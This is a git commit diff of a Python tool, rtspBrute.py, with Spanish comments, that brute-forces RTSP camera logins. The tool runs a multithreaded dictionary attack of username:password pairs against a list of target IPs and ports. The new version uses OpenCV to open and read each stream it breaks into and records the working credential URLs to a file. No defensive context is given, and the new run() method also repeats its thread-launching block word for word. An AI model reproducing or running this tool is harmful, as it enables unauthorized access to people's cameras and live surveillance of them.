8b3c79d549b01cac46cbdfc5f62aa35dc00fe72c
Fabri15544 <51274314+Fabri15544@users.noreply.github.com>
2024-06-07 19:09:17 +0200

    uso cv2 para Rtsp

--- rtspBrute.py
+++ rtspBrute.py
@@ -1,89 +1,116 @@
+import os
+import cv2
 import base64
 import socket
 import threading
 import queue
 import time
-from common import cargar_datos, guardar_datos, eliminar_duplicados, buscar_palabra
+from common import cargar_datos, guardar_datos
+
 
 class RtspBrute:
-    def __init__(self, targets, dictionary_file):
+    def __init__(self, targets, dictionary_file, pause_duration=1, max_threads=50):
         self.targets = targets
         self.dictionary = self.load_dictionary(dictionary_file)
+        self.pause_duration = pause_duration
+        self.max_threads = max_threads if max_threads is not None else len(self.targets)
         self.q = queue.Queue()
+
 
     def load_dictionary(self, dictionary_file):
         with open(dictionary_file, 'r') as f:
             return [line.strip() for line in f.readlines()]
 
     def run(self):
-        threads = min(len(self.targets), 100)
+        total_targets = len(self.targets)  # Obtener el número total de objetivos
+        print(f"Total targets: {total_targets}")
+
         for target in self.targets:
+##            print(f"Adding target: {target}")
             self.q.put(target)
 
-        print(f"Using {threads} threads")
-        _threads = [threading.Thread(target=self.brute_force) for _ in range(threads)]
-        
-        for t in _threads:
-            t.setDaemon(True)
-            t.start()
-        
-        for t in _threads:
-            t.join()
+        print(f"Using {self.max_threads} threads")
+        threads = []
+        while not self.q.empty():
+            while len(threads) < self.max_threads and not self.q.empty():
+                t = threading.Thread(target=self.brute_force)
+                t.setDaemon(True)
+                t.start()
+                threads.append(t)
+
+            for t in threads:
+                t.join()
+            threads.clear()
 
         print("Finished all threads")
 
-    def rtsp_request(self, target, username="", password=""):
-        ip, port = target
-        auth = f"{username}:{password}" if username else ""
-        auth_base64 = base64.b64encode(auth.encode()).decode() if auth else ""
-        req = f"DESCRIBE rtsp://{ip}:{port} RTSP/1.0\r\nCSeq: 2\r\n" + \
-              (f"Authorization: Basic {auth_base64}\r\n" if auth_base64 else "") + "\r\n"
+        print(f"Using {self.max_threads} threads")
+        threads = []
+        while not self.q.empty():
+            while len(threads) < self.max_threads and not self.q.empty():
+                t = threading.Thread(target=self.brute_force)
+                t.setDaemon(True)
+                t.start()
+                threads.append(t)
 
+            for t in threads:
+                t.join()
+            threads.clear()
+
+        print("Finished all threads")
+
+    def rtsp_request(self, target, username="", password="", desired_fps=100):
         try:
-            with socket.create_connection((ip, port), timeout=5) as s:
-                s.sendall(req.encode())
-                return s.recv(1024).decode()
-        except (socket.timeout, TimeoutError, socket.error, OSError):
-            return None
+            ip, port = target
+            url = f"rtsp://{username}:{password}@{ip}:{port}/"
+            # Verificar si la URL ya está en el archivo antes de intentar guardarla
+            if self.is_url_already_saved(url):
+                return
+            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "timeout;100"
+            cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
+            # Establecer la tasa de FPS deseada
+            cap.set(cv2.CAP_PROP_FPS, desired_fps)
+            if cap.isOpened():
+                print(f"Target: {url}")
+                with open("RTSPCONECT.txt", "a") as file:
+                    file.write(f"{url}\n")  # Guardar la dirección RTSP
+                while True:
+                    ret, frame = cap.read()
+                    if not ret:
+                        break
+                    if cv2.waitKey(1) & 0xFF == ord('q'):
+                        break
+                cap.release()
+                cv2.destroyAllWindows()
+        except cv2.error as e:
+            pass
+            #print(f"Error en la conexión RTSP: {e}")
+
+            
+    def is_url_already_saved(self, url):
+        with open("RTSPCONECT.txt", "r") as file:
+            for line in file:
+                if url.strip() == line.strip():
+                    return True
+        return False
 
     def brute_force(self):
         while not self.q.empty():
             target = self.q.get()
             ip, port = target
-            datos_filtrados = cargar_datos()
+            try:
+                datos_filtrados = cargar_datos()
+            except Exception as e:
+                print(f"Error loading data: {e}")
+                continue
+            
             for dato in datos_filtrados:
                 if dato["IP"] == ip and dato["Puerto"] == port:
                     if dato["Banner"] and dato["Banner"] != "\u001b[31munknown\u001b[0m":
-##                        print(f"Skip {ip}:{port}")
-                        return
+                        break
                     break
-            data = self.rtsp_request(target)
-            if data and "401 Unauthorized" in data:
-                for credential in self.dictionary:
-                    username, password = credential.split(':')
-                    data = self.rtsp_request(target, username, password)
-                    if data and "200 OK" in data:
-                        print(f"{target},{username},{password}")
-                        return
-                    elif data and "401 Unauthorized" in data:
-                        time.sleep(1)
-            elif data and "200 OK" in data:
-                print(f"The RTSP service at: {target} allows unauthorized access and does not need a username/password")
-                self.actualizar_banners()
-                return(f"The RTSP service at: {target} credentials not necessary")
 
-    def actualizar_banners(self):
-        datos_filtrados = cargar_datos()
-        for dato in datos_filtrados:
-            if dato["Puerto"] == 554 and (dato["Banner"] == "\u001b[31munknown\u001b[0m" or not dato["Banner"]):
-                ip, puerto = dato["IP"], dato["Puerto"]
-                rtsp_data = self.rtsp_request((ip, puerto))
-                if rtsp_data:
-                    print(f"El banner para {dato['IP']}:{dato['Puerto']} fue reemplazado por datos RTSP.")
-                    dato["Banner"] = rtsp_data
-                else:
-                    print(f"No se pudo obtener datos RTSP para {dato['IP']}:{dato['Puerto']}.")
-        try:
-            guardar_datos(datos_filtrados)
-        except Exception as e:
-            print(f"Error al guardar datos: {e}")
+            for credential in self.dictionary:
+                username, password = credential.split(':')
+                self.rtsp_request(target, username, password)
+                time.sleep(self.pause_duration)
